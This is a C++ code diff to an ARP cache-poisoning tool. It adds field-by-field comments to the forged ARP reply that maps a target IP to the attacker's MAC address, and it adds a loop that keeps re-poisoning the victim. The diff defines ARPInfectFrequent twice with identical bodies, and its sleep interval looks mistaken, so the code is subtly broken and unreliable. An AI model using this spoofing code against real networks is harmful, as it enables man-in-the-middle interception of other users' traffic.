@@ -1,6 +1,6 @@
 #include "arp-infect.h"
 
-void ARPInfect(
+void ARPInfectDetectPacket(
     pcap_t* handle,
     Mac& attacker_mac,
     Ip& attacker_ip,
@@ -9,7 +9,15 @@ void ARPInfect(
     Ip& target_ip)
 {
     // sender ARP infect 
-    sendARPPacket(handle, sender_mac, attacker_mac, attacker_mac, target_ip, sender_mac, sender_ip, false);
+    sendARPPacket(
+                handle,
+                sender_mac, // eth_dmac
+                attacker_mac, // eth_smac
+                attacker_mac, // arp_smac
+                target_ip,    // arp_sip
+                sender_mac,   // arp_tmac
+                sender_ip,    // arp_tip
+                false);       // isRequst
 
     // check if broadcast packet come
 
@@ -32,5 +40,32 @@ void ARPInfect(
             sendARPPacket(handle, sender_mac, attacker_mac, attacker_mac, target_ip, sender_mac, sender_ip, false);
         }
     }
-    
+}
+
+void ARPInfectFrequent(
+    pcap_t* handle,
+    Mac& attacker_mac,
+    Ip& attacker_ip,
+    Mac& sender_mac,
+    Ip& sender_ip,
+    Ip& target_ip)
+{
+    while(true){
+        sleep(1000*60*5);
+        sendARPPacket(handle, sender_mac, attacker_mac, attacker_mac, target_ip, sender_mac, sender_ip, false);
+    }
+}
+
+void ARPInfectFrequent(
+    pcap_t* handle,
+    Mac& attacker_mac,
+    Ip& attacker_ip,
+    Mac& sender_mac,
+    Ip& sender_ip,
+    Ip& target_ip)
+{
+    while(true){
+        sleep(1000*60*5);
+        sendARPPacket(handle, sender_mac, attacker_mac, attacker_mac, target_ip, sender_mac, sender_ip, false);
+    }
 }
